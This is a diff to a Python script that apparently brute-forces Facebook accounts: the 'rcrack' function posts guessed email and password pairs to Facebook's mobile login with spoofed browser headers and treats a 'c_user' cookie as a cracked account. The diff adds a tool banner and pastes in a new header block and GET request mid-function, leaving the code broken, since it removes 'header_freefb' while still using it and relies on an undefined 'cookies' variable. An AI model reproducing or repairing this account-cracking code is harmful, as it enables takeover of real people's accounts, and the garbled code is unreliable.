@@ -104,6 +104,7 @@ logo=("""\033[0;92m
 #     # #        #   #  #     #  #        # 
 #     # #         # #   #     #  #  #     # 
 ######  #######    #    #     # ###  #####  
+┏━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓             ┃CEO : HASAN IMAM┃TOOL : BD/INDIA┃             ┃CEO : DEVHIS       ┃VERSION : 1.2  ┃             ┣━━━━━━━━━━━━━━━━━━━━━━┳━━┻━━━━━━━━━━━━━━━┫             ┃GITHUB : X74TEAM ┃TYPE : FREE RANDOM┃             ┗━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━┛             
 _____________________________
 
 Auther     : DEVHIS
@@ -386,27 +387,29 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'x.facebook.com',
-			'upgrade-insecure-requests': '1',
-			'viewport-width': '980',
-			'method': 'POST',
-			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-			'dnt':'1', 
-			'referer': 'https://mobile.facebook.com/',
-			'x-requested-with':'mark.via.gp', 
-			'sec-fetch-user': '?1',
-		    'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'same-origin',
-			'upgrade-insecure-requests': '1',
-			'accept-encoding':'gzip, deflate, br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-			'cache-control': 'max-age=0',
-			'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Window"',
-			'sec-ch-device-memory': '8',
-			"sec-ch-prefers-color-scheme": '"light"',
-            "user-agent": pro}
+            import requests
+
+headers = {
+    'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
+}
+
+response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
+
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
